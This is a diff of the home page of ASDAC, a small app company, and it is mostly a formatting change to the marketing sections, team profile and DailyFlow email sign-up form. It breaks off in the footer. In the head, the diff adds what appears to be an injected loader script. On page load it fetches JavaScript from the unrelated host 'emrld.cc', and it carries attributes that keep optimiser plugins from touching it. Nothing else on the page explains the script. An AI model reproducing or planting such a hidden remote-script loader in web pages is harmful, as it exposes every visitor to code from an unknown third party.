@@ -1,377 +1,682 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>ASDAC - Enriching Daily Lives Through Technology</title>
-    <meta name="description" content="ASDAC creates beautiful apps designed to simplify your routine and bring joy to everyday moments through thoughtful technology.">
-    
+    <meta
+      name="description"
+      content="ASDAC creates beautiful apps designed to simplify your routine and bring joy to everyday moments through thoughtful technology."
+    />
+
     <!-- SEO Meta Tags -->
-    <meta name="keywords" content="ASDAC, technology, mobile apps, user experience, human-centered design">
-    <meta name="author" content="Amar Sibia">
-    <meta name="robots" content="index, follow">
-    
+    <meta
+      name="keywords"
+      content="ASDAC, technology, mobile apps, user experience, human-centered design"
+    />
+    <meta name="author" content="Amar Sibia" />
+    <meta name="robots" content="index, follow" />
+
     <!-- Open Graph / Social Media Meta Tags -->
-    <meta property="og:type" content="website">
-    <meta property="og:url" content="https://www.asdac.co.uk/">
-    <meta property="og:title" content="ASDAC - Enriching Daily Lives Through Technology">
-    <meta property="og:description" content="Creating beautiful apps designed to simplify your routine and bring joy to everyday moments.">
-    <meta property="og:image" content="https://www.asdac.co.uk/assets/images/og-image.webp">
-    <meta property="og:image:type" content="image/webp">
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
+    <meta property="og:type" content="website" />
+    <meta property="og:url" content="https://www.asdac.co.uk/" />
+    <meta
+      property="og:title"
+      content="ASDAC - Enriching Daily Lives Through Technology"
+    />
+    <meta
+      property="og:description"
+      content="Creating beautiful apps designed to simplify your routine and bring joy to everyday moments."
+    />
+    <meta
+      property="og:image"
+      content="https://www.asdac.co.uk/assets/images/og-image.webp"
+    />
+    <meta property="og:image:type" content="image/webp" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
     <!-- Fallback for platforms that do not support WebP -->
-    <meta property="og:image:alt" content="ASDAC - Enriching Daily Lives Through Technology">
-    <meta property="og:image" content="https://www.asdac.co.uk/assets/images/og-image.png">
-    <meta property="og:image:type" content="image/png">
-    
+    <meta
+      property="og:image:alt"
+      content="ASDAC - Enriching Daily Lives Through Technology"
+    />
+    <meta
+      property="og:image"
+      content="https://www.asdac.co.uk/assets/images/og-image.png"
+    />
+    <meta property="og:image:type" content="image/png" />
+
     <!-- Twitter Meta Tags -->
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="ASDAC - Enriching Daily Lives Through Technology">
-    <meta name="twitter:description" content="Creating beautiful apps designed to simplify your routine and bring joy to everyday moments.">
-    <meta name="twitter:image" content="https://www.asdac.co.uk/assets/images/og-image.webp">
-    <meta name="twitter:image:type" content="image/webp">
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta
+      name="twitter:title"
+      content="ASDAC - Enriching Daily Lives Through Technology"
+    />
+    <meta
+      name="twitter:description"
+      content="Creating beautiful apps designed to simplify your routine and bring joy to everyday moments."
+    />
+    <meta
+      name="twitter:image"
+      content="https://www.asdac.co.uk/assets/images/og-image.webp"
+    />
+    <meta name="twitter:image:type" content="image/webp" />
     <!-- Fallback for Twitter if WebP is not supported -->
-    <meta name="twitter:image" content="https://www.asdac.co.uk/assets/images/og-image.png">
-    <meta name="twitter:image:type" content="image/png">
-    
+    <meta
+      name="twitter:image"
+      content="https://www.asdac.co.uk/assets/images/og-image.png"
+    />
+    <meta name="twitter:image:type" content="image/png" />
+
     <!-- Preload critical fonts -->
-    <link rel="preload" href="https://fonts.googleapis.com/css2?family=Montserrat:wght@600&display=swap" as="style">
-    <link rel="preload" href="https://fonts.gstatic.com/s/montserrat/v25/JTUHjIg1_i6t8kCHKm4532VJOt5-QNFgpCu173w5aXx-p7K4KLg.woff2" as="font" type="font/woff2" crossorigin>
-    
-    <link rel="stylesheet" href="styles.min.css">
-    <link rel="icon" href="/assets/images/favicon.ico" type="image/x-icon">
-    <link rel="apple-touch-icon" href="/assets/images/apple-touch-icon.png">
-    <link rel="canonical" href="https://www.asdac.co.uk/">
-</head>
-<body>
+    <link
+      rel="preload"
+      href="https://fonts.googleapis.com/css2?family=Montserrat:wght@600&display=swap"
+      as="style"
+    />
+    <link
+      rel="preload"
+      href="https://fonts.gstatic.com/s/montserrat/v25/JTUHjIg1_i6t8kCHKm4532VJOt5-QNFgpCu173w5aXx-p7K4KLg.woff2"
+      as="font"
+      type="font/woff2"
+      crossorigin
+    />
+
+    <link rel="stylesheet" href="styles.min.css" />
+    <link rel="icon" href="/assets/images/favicon.ico" type="image/x-icon" />
+    <link rel="apple-touch-icon" href="/assets/images/apple-touch-icon.png" />
+    <link rel="canonical" href="https://www.asdac.co.uk/" />
+    <script data-noptimize="1" data-cfasync="false" data-wpfc-render="false">
+      (function () {
+        var script = document.createElement("script");
+        script.async = 1;
+        script.src = "https://emrld.cc/NTA4Mjg1.js?t=508285";
+        document.head.appendChild(script);
+      })();
+    </script>
+  </head>
+  <body>
     <a href="#main-content" class="skip-to-content">Skip to content</a>
-    
+
     <div class="cursor"></div>
     <div class="cursor-dot"></div>
 
-    <nav class="nav-container" id="navbar" role="navigation" aria-label="Main Navigation">
-        <div class="logo">ASDAC</div>
-        <ul class="nav-links">
-            <li><a href="#about" class="nav-link">About</a></li>
-            <li><a href="#clients" class="nav-link">Clients</a></li>
-            <li><a href="#features" class="nav-link">Philosophy</a></li>
-            <li><a href="#team" class="nav-link">Team</a></li>
-            <li><a href="#coming-soon" class="nav-link">Coming Soon</a></li>
-        </ul>
-        <button class="theme-toggle" id="theme-toggle" aria-label="Toggle dark mode">🌙</button>
-        <button class="hamburger" id="hamburger-btn" aria-label="Open menu" aria-expanded="false" aria-controls="mobile-menu">☰</button>
+    <nav
+      class="nav-container"
+      id="navbar"
+      role="navigation"
+      aria-label="Main Navigation"
+    >
+      <div class="logo">ASDAC</div>
+      <ul class="nav-links">
+        <li><a href="#about" class="nav-link">About</a></li>
+        <li><a href="#clients" class="nav-link">Clients</a></li>
+        <li><a href="#features" class="nav-link">Philosophy</a></li>
+        <li><a href="#team" class="nav-link">Team</a></li>
+        <li><a href="#coming-soon" class="nav-link">Coming Soon</a></li>
+      </ul>
+      <button
+        class="theme-toggle"
+        id="theme-toggle"
+        aria-label="Toggle dark mode"
+      >
+        🌙
+      </button>
+      <button
+        class="hamburger"
+        id="hamburger-btn"
+        aria-label="Open menu"
+        aria-expanded="false"
+        aria-controls="mobile-menu"
+      >
+        ☰
+      </button>
     </nav>
 
-    <div class="mobile-menu" id="mobile-menu" aria-hidden="true" role="dialog" aria-modal="true" aria-label="Mobile navigation">
-        <button class="close-menu" id="close-menu-btn" aria-label="Close menu">&times;</button>
-        <ul class="nav-links">
-            <li><a href="#about" class="nav-link">About</a></li>
-            <li><a href="#clients" class="nav-link">Clients</a></li>
-            <li><a href="#features" class="nav-link">Philosophy</a></li>
-            <li><a href="#team" class="nav-link">Team</a></li>
-            <li><a href="#coming-soon" class="nav-link">Coming Soon</a></li>
-        </ul>
-        <button class="theme-toggle mobile-theme-toggle" id="mobile-theme-toggle" aria-label="Toggle dark mode">🌙</button>
+    <div
+      class="mobile-menu"
+      id="mobile-menu"
+      aria-hidden="true"
+      role="dialog"
+      aria-modal="true"
+      aria-label="Mobile navigation"
+    >
+      <button class="close-menu" id="close-menu-btn" aria-label="Close menu">
+        &times;
+      </button>
+      <ul class="nav-links">
+        <li><a href="#about" class="nav-link">About</a></li>
+        <li><a href="#clients" class="nav-link">Clients</a></li>
+        <li><a href="#features" class="nav-link">Philosophy</a></li>
+        <li><a href="#team" class="nav-link">Team</a></li>
+        <li><a href="#coming-soon" class="nav-link">Coming Soon</a></li>
+      </ul>
+      <button
+        class="theme-toggle mobile-theme-toggle"
+        id="mobile-theme-toggle"
+        aria-label="Toggle dark mode"
+      >
+        🌙
+      </button>
     </div>
 
     <header>
-        <canvas id="hero-bg-canvas" style="position:absolute;top:0;left:0;width:100%;height:100%;z-index:0;display:block;" aria-hidden="true"></canvas>
+      <canvas
+        id="hero-bg-canvas"
+        style="
+          position: absolute;
+          top: 0;
+          left: 0;
+          width: 100%;
+          height: 100%;
+          z-index: 0;
+          display: block;
+        "
+        aria-hidden="true"
+      ></canvas>
 
-        <div class="header-content">
-            <h1 class="header-title">Enriching Daily Lives Through Thoughtful Technology</h1>
-            <p class="tagline">We create beautiful apps designed to simplify your routine and bring joy to everyday moments.</p>
-            <a href="#coming-soon" class="header-btn">Get Early Access</a>
-        </div>
+      <div class="header-content">
+        <h1 class="header-title">
+          Enriching Daily Lives Through Thoughtful Technology
+        </h1>
+        <p class="tagline">
+          We create beautiful apps designed to simplify your routine and bring
+          joy to everyday moments.
+        </p>
+        <a href="#coming-soon" class="header-btn">Get Early Access</a>
+      </div>
 
-        <a href="#about" class="scroll-indicator" aria-label="Scroll down">
-            ↓
-        </a>
+      <a href="#about" class="scroll-indicator" aria-label="Scroll down"> ↓ </a>
     </header>
 
     <div class="container">
-        <main id="main-content"> 
+      <main id="main-content">
+        <section id="about" aria-labelledby="about-title">
+          <h2 class="section-title" id="about-title">
+            <span>Who We Are</span>Creating Technology That Enhances Human
+            Connection
+          </h2>
+          <div class="about-content">
+            <div class="about-text">
+              <p>
+                Welcome to ASDAC, where we believe technology should seamlessly
+                integrate into your daily routines to enhance your quality of
+                life. Our team of passionate developers and designers work
+                tirelessly to create applications that simplify tasks, foster
+                connections, and bring joy to everyday experiences.
+              </p>
+              <p>
+                Founded with the vision of making technology more human-centric,
+                we prioritise intuitive design and meaningful functionality in
+                every application we develop. Our approach combines innovation
+                with practicality, ensuring our solutions address real needs
+                rather than simply showcasing technological prowess.
+              </p>
+              <p>
+                At ASDAC, we're not just building apps—we're crafting
+                experiences that respect your time, attention, and wellbeing.
+                Every feature we implement is thoughtfully designed to add
+                genuine value to your life, without unnecessary complexity or
+                digital clutter.
+              </p>
+            </div>
+            <div class="about-image">
+              <div class="about-graphic">
+                <svg
+                  viewBox="0 0 500 500"
+                  fill="none"
+                  xmlns="http://www.w3.org/2000/svg"
+                  aria-hidden="true"
+                >
+                  <circle
+                    cx="250"
+                    cy="250"
+                    r="150"
+                    stroke="white"
+                    stroke-width="2"
+                    opacity="0.6"
+                  />
+                  <circle
+                    cx="250"
+                    cy="250"
+                    r="100"
+                    stroke="white"
+                    stroke-width="2"
+                    opacity="0.8"
+                  />
+                  <circle cx="250" cy="250" r="50" fill="white" opacity="0.1" />
+                  <line
+                    x1="100"
+                    y1="250"
+                    x2="400"
+                    y2="250"
+                    stroke="white"
+                    stroke-width="2"
+                    opacity="0.5"
+                  />
+                  <line
+                    x1="250"
+                    y1="100"
+                    x2="250"
+                    y2="400"
+                    stroke="white"
+                    stroke-width="2"
+                    opacity="0.5"
+                  />
+                  <circle
+                    cx="150"
+                    cy="150"
+                    r="20"
+                    fill="var(--primary)"
+                    opacity="0.9"
+                  />
+                  <circle
+                    cx="350"
+                    cy="150"
+                    r="15"
+                    fill="var(--secondary)"
+                    opacity="0.9"
+                  />
+                  <circle
+                    cx="150"
+                    cy="350"
+                    r="15"
+                    fill="var(--secondary)"
+                    opacity="0.9"
+                  />
+                  <circle
+                    cx="350"
+                    cy="350"
+                    r="25"
+                    fill="var(--accent)"
+                    opacity="0.9"
+                  />
+                </svg>
+              </div>
+            </div>
+          </div>
+        </section>
 
-            <section id="about" aria-labelledby="about-title">
-                <h2 class="section-title" id="about-title"><span>Who We Are</span>Creating Technology That Enhances Human Connection</h2>
-                <div class="about-content">
-                    <div class="about-text">
-                        <p>
-                            Welcome to ASDAC, where we believe technology should seamlessly integrate into your daily routines to enhance your quality of life. Our team of passionate developers and designers work tirelessly to create applications that simplify tasks, foster connections, and bring joy to everyday experiences.
-                        </p>
-                        <p>
-                            Founded with the vision of making technology more human-centric, we prioritise intuitive design and meaningful functionality in every application we develop. Our approach combines innovation with practicality, ensuring our solutions address real needs rather than simply showcasing technological prowess.
-                        </p>
-                        <p>
-                            At ASDAC, we're not just building apps—we're crafting experiences that respect your time, attention, and wellbeing. Every feature we implement is thoughtfully designed to add genuine value to your life, without unnecessary complexity or digital clutter.
-                        </p>
-                    </div>
-                    <div class="about-image">
-                        <div class="about-graphic">
-                            <svg viewBox="0 0 500 500" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
-                                <circle cx="250" cy="250" r="150" stroke="white" stroke-width="2" opacity="0.6"/>
-                                <circle cx="250" cy="250" r="100" stroke="white" stroke-width="2" opacity="0.8"/>
-                                <circle cx="250" cy="250" r="50" fill="white" opacity="0.1" />
-                                <line x1="100" y1="250" x2="400" y2="250" stroke="white" stroke-width="2" opacity="0.5"/>
-                                <line x1="250" y1="100" x2="250" y2="400" stroke="white" stroke-width="2" opacity="0.5"/>
-                                <circle cx="150" cy="150" r="20" fill="var(--primary)" opacity="0.9"/>
-                                <circle cx="350" cy="150" r="15" fill="var(--secondary)" opacity="0.9"/>
-                                <circle cx="150" cy="350" r="15" fill="var(--secondary)" opacity="0.9"/>
-                                <circle cx="350" cy="350" r="25" fill="var(--accent)" opacity="0.9"/>
-                            </svg>
-                        </div>
-                    </div>
+        <section
+          id="clients"
+          class="clients-section"
+          aria-labelledby="clients-title"
+        >
+          <div class="container">
+            <h2 class="section-title" id="clients-title">
+              <span>Our Clients</span>Trusted Partners in Progress
+            </h2>
+            <div class="clients-grid">
+              <div class="client-card">
+                <div class="client-logo">C</div>
+                <h3 class="client-name">Capita</h3>
+                <p class="client-description">
+                  Partnered to transform complex operations, designing intuitive
+                  systems that streamlined workflows and enhanced the user
+                  experience through thoughtful automation
+                </p>
+              </div>
+              <div class="client-card">
+                <div class="client-logo">HPE</div>
+                <h3 class="client-name">Hewlett Packard Enterprise</h3>
+                <p class="client-description">
+                  Developed a tailored, user-focused system improving daily
+                  tasks for thousands, alongside seamless integration solutions
+                  that unlocked new potential in existing tools
+                </p>
+              </div>
+              <div class="client-card">
+                <div class="client-logo">CG</div>
+                <h3 class="client-name">Capgemini</h3>
+                <p class="client-description">
+                  Facilitated a smooth evolution to improved document management
+                  via a robust integration service, enhancing system efficiency
+                  and reliability for users
+                </p>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <section id="features" aria-labelledby="features-title">
+          <h2 class="section-title" id="features-title">
+            <span>Our Philosophy</span>User-Centred Design Principles
+          </h2>
+          <div class="features-grid">
+            <div class="feature-card">
+              <div class="feature-icon">🎯</div>
+              <h3 class="feature-title">User-Focused Design</h3>
+              <p>
+                We create apps with you at the centre, ensuring intuitive
+                interfaces and meaningful experiences that fit naturally into
+                your daily routines.
+              </p>
+            </div>
+            <div class="feature-card">
+              <div class="feature-icon">💡</div>
+              <h3 class="feature-title">Innovative Solutions</h3>
+              <p>
+                Combining creativity with technical expertise to develop unique
+                solutions that address common challenges in fresh, effective
+                ways.
+              </p>
+            </div>
+            <div class="feature-card">
+              <div class="feature-icon">🛠️</div>
+              <h3 class="feature-title">Quality Craftsmanship</h3>
+              <p>
+                Building robust, reliable applications that perform consistently
+                and evolve thoughtfully based on user feedback and needs.
+              </p>
+            </div>
+            <div class="feature-card">
+              <div class="feature-icon">❤️</div>
+              <h3 class="feature-title">Ethical Technology</h3>
+              <p>
+                Developing apps with a strong ethical foundation, respecting
+                your privacy, attention, and wellbeing without exploiting data.
+              </p>
+            </div>
+            <div class="feature-card">
+              <div class="feature-icon">💬</div>
+              <h3 class="feature-title">Human Connection</h3>
+              <p>
+                Technology should bring people together. We design apps to
+                facilitate meaningful connections and enhance real-world
+                interactions.
+              </p>
+            </div>
+            <div class="feature-card">
+              <div class="feature-icon">🔄</div>
+              <h3 class="feature-title">Continuous Evolution</h3>
+              <p>
+                Embracing an iterative approach, regularly refining our
+                applications based on user feedback and emerging needs.
+              </p>
+            </div>
+          </div>
+        </section>
+
+        <section id="team" class="team-section" aria-labelledby="team-title">
+          <h2 class="section-title" id="team-title">
+            <span>Our Team</span>The Passionate People Behind ASDAC
+          </h2>
+          <div class="team-intro">
+            <p>
+              We're a diverse team of designers, developers, and thinkers united
+              by our shared vision of creating technology that truly enriches
+              people's lives. Each of us brings unique perspectives and skills,
+              fostering a collaborative environment where innovation thrives.
+            </p>
+          </div>
+          <div class="team-grid">
+            <div class="team-member">
+              <div class="member-photo">
+                <img
+                  src="assets/images/profile.webp"
+                  alt="Amar Sibia, Founder & CEO"
+                  loading="lazy"
+                  srcset="
+                    assets/images/profile.webp 1x,
+                    assets/images/profile.webp 2x
+                  "
+                  width="400"
+                  height="400"
+                  onerror="
+                    this.src =
+                      'https://placehold.co/400x400/E60000/FFFFFF?text=AS';
+                    this.onerror = null;
+                  "
+                />
+              </div>
+              <h3 class="member-name">Amar Sibia</h3>
+              <p class="member-role">Founder & CEO</p>
+              <p class="member-bio">
+                Leads with a focus on human-computer interaction, creating
+                technology that serves genuine human needs.
+              </p>
+            </div>
+          </div>
+        </section>
+
+        <section
+          id="testimonials"
+          class="testimonials-section"
+          style="display: none"
+          aria-labelledby="testimonials-title"
+        >
+          {/* Keep hidden for now */}
+          <div class="testimonials-bg"></div>
+          <div class="testimonials-container">
+            <h2 class="section-title" id="testimonials-title">
+              <span>User Stories</span>Why People Love Our Approach
+            </h2>
+            <div class="testimonials-grid">
+              <div class="testimonial-card">
+                <p class="testimonial-text">
+                  "What impressed me most is how they truly listen to user
+                  feedback. They've created technology that feels designed
+                  specifically for my needs, not just another app trying to grab
+                  my attention."
+                </p>
+                <div class="testimonial-author">
+                  <div class="author-photo">
+                    <img
+                      src="https://placehold.co/100x100/CCCCCC/FFFFFF?text=EK"
+                      alt="Photo of Emily K., Early Adopter"
+                      loading="lazy"
+                      width="100"
+                      height="100"
+                      onerror="
+                        this.src =
+                          'https://placehold.co/100x100/CCCCCC/FFFFFF?text=Pic';
+                        this.onerror = null;
+                      "
+                    />
+                  </div>
+                  <div class="author-info">
+                    <h4>Emily K.</h4>
+                    <p>Early Adopter</p>
+                  </div>
                 </div>
-            </section>
-
-            <section id="clients" class="clients-section" aria-labelledby="clients-title">
-                <div class="container">
-                    <h2 class="section-title" id="clients-title"><span>Our Clients</span>Trusted Partners in Progress</h2>
-                    <div class="clients-grid">
-                        <div class="client-card">
-                            <div class="client-logo">C</div>
-                            <h3 class="client-name">Capita</h3>
-                            <p class="client-description">
-                                Partnered to transform complex operations, designing intuitive systems that streamlined workflows and enhanced the user experience through thoughtful automation
-                            </p>
-                        </div>
-                        <div class="client-card">
-                            <div class="client-logo">HPE</div>
-                            <h3 class="client-name">Hewlett Packard Enterprise</h3>
-                            <p class="client-description">
-                                Developed a tailored, user-focused system improving daily tasks for thousands, alongside seamless integration solutions that unlocked new potential in existing tools
-                            </p>
-                        </div>
-                        <div class="client-card">
-                            <div class="client-logo">CG</div>
-                            <h3 class="client-name">Capgemini</h3>
-                            <p class="client-description">
-                                Facilitated a smooth evolution to improved document management via a robust integration service, enhancing system efficiency and reliability for users
-                            </p>
-                        </div>
-                    </div>
+              </div>
+              <div class="testimonial-card">
+                <p class="testimonial-text">
+                  "In a world of overwhelming apps, ASDAC's philosophy is
+                  refreshing. They create tools that respect my attention and
+                  genuinely make my day more productive without adding digital
+                  clutter."
+                </p>
+                <div class="testimonial-author">
+                  <div class="author-photo">
+                    <img
+                      src="https://placehold.co/100x100/CCCCCC/FFFFFF?text=JT"
+                      alt="Photo of James T., Beta Tester"
+                      loading="lazy"
+                      width="100"
+                      height="100"
+                      onerror="
+                        this.src =
+                          'https://placehold.co/100x100/CCCCCC/FFFFFF?text=Pic';
+                        this.onerror = null;
+                      "
+                    />
+                  </div>
+                  <div class="author-info">
+                    <h4>James T.</h4>
+                    <p>Beta Tester</p>
+                  </div>
                 </div>
-            </section>
+              </div>
+            </div>
+          </div>
+        </section>
 
-            <section id="features" aria-labelledby="features-title">
-                <h2 class="section-title" id="features-title"><span>Our Philosophy</span>User-Centred Design Principles</h2>
-                <div class="features-grid">
-                    <div class="feature-card">
-                        <div class="feature-icon">🎯</div>
-                        <h3 class="feature-title">User-Focused Design</h3>
-                        <p>We create apps with you at the centre, ensuring intuitive interfaces and meaningful experiences that fit naturally into your daily routines.</p>
-                    </div>
-                    <div class="feature-card">
-                        <div class="feature-icon">💡</div>
-                        <h3 class="feature-title">Innovative Solutions</h3>
-                        <p>Combining creativity with technical expertise to develop unique solutions that address common challenges in fresh, effective ways.</p>
-                    </div>
-                    <div class="feature-card">
-                        <div class="feature-icon">🛠️</div>
-                        <h3 class="feature-title">Quality Craftsmanship</h3>
-                        <p>Building robust, reliable applications that perform consistently and evolve thoughtfully based on user feedback and needs.</p>
-                    </div>
-                    <div class="feature-card">
-                        <div class="feature-icon">❤️</div>
-                        <h3 class="feature-title">Ethical Technology</h3>
-                        <p>Developing apps with a strong ethical foundation, respecting your privacy, attention, and wellbeing without exploiting data.</p>
-                    </div>
-                    <div class="feature-card">
-                        <div class="feature-icon">💬</div>
-                        <h3 class="feature-title">Human Connection</h3>
-                        <p>Technology should bring people together. We design apps to facilitate meaningful connections and enhance real-world interactions.</p>
-                    </div>
-                    <div class="feature-card">
-                        <div class="feature-icon">🔄</div>
-                        <h3 class="feature-title">Continuous Evolution</h3>
-                        <p>Embracing an iterative approach, regularly refining our applications based on user feedback and emerging needs.</p>
-                    </div>
-                </div>
-            </section>
+        <section
+          id="coming-soon"
+          class="coming-soon-section"
+          aria-labelledby="coming-soon-title"
+        >
+          <div class="container">
+            <h2 class="section-title" id="coming-soon-title">
+              <span>Coming Soon</span>Our First App Is Almost Ready
+            </h2>
+            <div class="app-preview">
+              <h3 class="coming-soon">DailyFlow</h3>
+              <p>
+                DailyFlow is your intelligent daily planner, designed to help
+                you prioritize what matters most. Effortlessly organize tasks,
+                set mindful routines, and enjoy a calmer, more productive
+                day—without the digital clutter. Experience a new way to stay
+                focused and in control, every day.
+              </p>
+              <p>
+                Be the first to experience DailyFlow. Enter your email and we'll
+                let you know the moment we launch!
+              </p>
 
-            <section id="team" class="team-section" aria-labelledby="team-title">
-                <h2 class="section-title" id="team-title"><span>Our Team</span>The Passionate People Behind ASDAC</h2>
-                <div class="team-intro">
-                    <p>
-                        We're a diverse team of designers, developers, and thinkers united by our shared vision of creating technology that truly enriches people's lives. Each of us brings unique perspectives and skills, fostering a collaborative environment where innovation thrives.
-                    </p>
-                </div>
-                <div class="team-grid">
-                    <div class="team-member">
-                        <div class="member-photo">
-                            <img src="assets/images/profile.webp" alt="Amar Sibia, Founder & CEO" loading="lazy" srcset="assets/images/profile.webp 1x, assets/images/profile.webp 2x" width="400" height="400" onerror="this.src='https://placehold.co/400x400/E60000/FFFFFF?text=AS'; this.onerror=null;">
+              <form
+                class="subscribe-form"
+                id="subscribe-form"
+                aria-describedby="form-message"
+              >
+                <label for="email-input" class="sr-only">Email Address</label>
+                <input
+                  type="email"
+                  id="email-input"
+                  class="subscribe-input"
+                  placeholder="Your email address"
+                  required
+                  aria-required="true"
+                  autocomplete="email"
+                />
+                <button type="submit" class="subscribe-button">
+                  Notify Me at Launch
+                </button>
+              </form>
+              <div id="form-message" role="status" aria-live="polite"></div>
+
+              <div class="device-mockup" aria-hidden="true">
+                <div class="device-frame">
+                  <div class="device-notch"></div>
+                  <div class="device-screen">
+                    <div class="device-app">
+                      <div class="app-header">
+                        <div class="app-title">DailyFlow</div>
+                        <div class="app-menu">⋮</div>
+                      </div>
+                      <div class="app-content">
+                        <div class="app-card" style="animation-delay: 0s">
+                          <div class="card-icon">1</div>
+                          <div class="card-content">
+                            <div class="card-title">Morning Routine</div>
+                            <div class="card-subtitle">3 tasks completed</div>
+                          </div>
                         </div>
-                        <h3 class="member-name">Amar Sibia</h3>
-                        <p class="member-role">Founder & CEO</p>
-                        <p class="member-bio">Leads with a focus on human-computer interaction, creating technology that serves genuine human needs.</p>
-                    </div>
-                </div>
-            </section>
-
-            <section id="testimonials" class="testimonials-section" style="display: none;" aria-labelledby="testimonials-title"> {/* Keep hidden for now */}
-                <div class="testimonials-bg"></div>
-                <div class="testimonials-container">
-                    <h2 class="section-title" id="testimonials-title"><span>User Stories</span>Why People Love Our Approach</h2>
-                    <div class="testimonials-grid">
-                        <div class="testimonial-card">
-                            <p class="testimonial-text">
-                                "What impressed me most is how they truly listen to user feedback. They've created technology that feels designed specifically for my needs, not just another app trying to grab my attention."
-                            </p>
-                            <div class="testimonial-author">
-                                <div class="author-photo">
-                                
-                                    <img src="https://placehold.co/100x100/CCCCCC/FFFFFF?text=EK" alt="Photo of Emily K., Early Adopter" loading="lazy" width="100" height="100" onerror="this.src='https://placehold.co/100x100/CCCCCC/FFFFFF?text=Pic'; this.onerror=null;">
-                                </div>
-                                <div class="author-info">
-                                    <h4>Emily K.</h4>
-                                    <p>Early Adopter</p>
-                                </div>
-                            </div>
+                        <div class="app-card" style="animation-delay: 0.5s">
+                          <div class="card-icon">2</div>
+                          <div class="card-content">
+                            <div class="card-title">Work Focus</div>
+                            <div class="card-subtitle">In progress</div>
+                          </div>
                         </div>
-                        <div class="testimonial-card">
-                            <p class="testimonial-text">
-                                "In a world of overwhelming apps, ASDAC's philosophy is refreshing. They create tools that respect my attention and genuinely make my day more productive without adding digital clutter."
-                            </p>
-                            <div class="testimonial-author">
-                                <div class="author-photo">
-                                    
-                                    <img src="https://placehold.co/100x100/CCCCCC/FFFFFF?text=JT" alt="Photo of James T., Beta Tester" loading="lazy" width="100" height="100" onerror="this.src='https://placehold.co/100x100/CCCCCC/FFFFFF?text=Pic'; this.onerror=null;">
-                                </div>
-                                <div class="author-info">
-                                    <h4>James T.</h4>
-                                    <p>Beta Tester</p>
-                                </div>
-                            </div>
+                        <div class="app-card" style="animation-delay: 1s">
+                          <div class="card-icon">3</div>
+                          <div class="card-content">
+                            <div class="card-title">Evening Reflection</div>
+                            <div class="card-subtitle">Upcoming</div>
+                          </div>
                         </div>
+                      </div>
                     </div>
+                  </div>
                 </div>
-            </section>
-
-            <section id="coming-soon" class="coming-soon-section" aria-labelledby="coming-soon-title">
-            
-                <div class="container">
-                    <h2 class="section-title" id="coming-soon-title"><span>Coming Soon</span>Our First App Is Almost Ready</h2>
-                    <div class="app-preview">
-                        <h3 class="coming-soon">DailyFlow</h3>
-                        <p>
-                            DailyFlow is your intelligent daily planner, designed to help you prioritize what matters most. Effortlessly organize tasks, set mindful routines, and enjoy a calmer, more productive day—without the digital clutter. Experience a new way to stay focused and in control, every day.
-                        </p>
-                        <p>Be the first to experience DailyFlow. Enter your email and we'll let you know the moment we launch!</p>
-
-                        <form class="subscribe-form" id="subscribe-form" aria-describedby="form-message">
-                            <label for="email-input" class="sr-only">Email Address</label>
-                            <input type="email" id="email-input" class="subscribe-input" placeholder="Your email address" required aria-required="true" autocomplete="email">
-                            <button type="submit" class="subscribe-button">Notify Me at Launch</button>
-                        </form>
-                        <div id="form-message" role="status" aria-live="polite"></div>
-
-                        <div class="device-mockup" aria-hidden="true">
-                            <div class="device-frame">
-                                <div class="device-notch"></div>
-                                <div class="device-screen">
-                                    <div class="device-app">
-                                        <div class="app-header">
-                                            <div class="app-title">DailyFlow</div>
-                                            <div class="app-menu">⋮</div>
-                                        </div>
-                                        <div class="app-content">
-                                            <div class="app-card" style="animation-delay: 0s;">
-                                                <div class="card-icon">1</div>
-                                                <div class="card-content">
-                                                    <div class="card-title">Morning Routine</div>
-                                                    <div class="card-subtitle">3 tasks completed</div>
-                                                </div>
-                                            </div>
-                                            <div class="app-card" style="animation-delay: 0.5s;">
-                                                <div class="card-icon">2</div>
-                                                <div class="card-content">
-                                                    <div class="card-title">Work Focus</div>
-                                                    <div class="card-subtitle">In progress</div>
-                                                </div>
-                                            </div>
-                                            <div class="app-card" style="animation-delay: 1s;">
-                                                <div class="card-icon">3</div>
-                                                <div class="card-content">
-                                                    <div class="card-title">Evening Reflection</div>
-                                                    <div class="card-subtitle">Upcoming</div>
-                                                </div>
-                                            </div>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </section>
-
-        </main>
+              </div>
+            </div>
+          </div>
+        </section>
+      </main>
     </div>
     <footer role="contentinfo">
-        <div class="footer-content">
-            <div class="footer-brand">
-                <div class="logo">ASDAC</div>
-                <p>
-                    Creating thoughtful technology that enriches daily life through intuitive design and meaningful functionality.
-                </p>
-                
-                <div class="social-links" style="display: none;">
-                
-                    <a href="#" class="social-link" aria-label="ASDAC on Twitter">🐦</a>
-                    <a href="#" class="social-link" aria-label="ASDAC on Instagram">📷</a>
-                    <a href="#" class="social-link" aria-label="ASDAC on LinkedIn">💼</a>
-                    <a href="#" class="social-link" aria-label="ASDAC on GitHub">💻</a>
-                </div>
-            </div>
+      <div class="footer-content">
+        <div class="footer-brand">
+          <div class="logo">ASDAC</div>
+          <p>
+            Creating thoughtful technology that enriches daily life through
+            intuitive design and meaningful functionality.
+          </p>
 
-            <nav class="footer-nav" aria-labelledby="footer-nav-heading">
-                <h3 id="footer-nav-heading" class="footer-heading">Explore</h3>
-                <ul class="footer-links">
-                    <li><a href="#about">About Us</a></li>
-                    <li><a href="#features">Our Approach</a></li>
-                    <li><a href="#team">Our Team</a></li>
-                    <li><a href="#coming-soon">Coming Soon</a></li>
-                </ul>
-            </nav>
-
-            <div class="footer-contact">
-                <h3 class="footer-heading">Contact</h3>
-                <ul class="footer-links">
-                    <li><a href="mailto:hello@asdac.com">hello@asdac.co.uk</a></li>
-                    
-                    <li style="display: none;"><address>123 Innovation Street<br>London, UK</address></li>
-                </ul>
-            </div>
+          <div class="social-links" style="display: none">
+            <a href="#" class="social-link" aria-label="ASDAC on Twitter">🐦</a>
+            <a href="#" class="social-link" aria-label="ASDAC on Instagram"
+              >📷</a
+            >
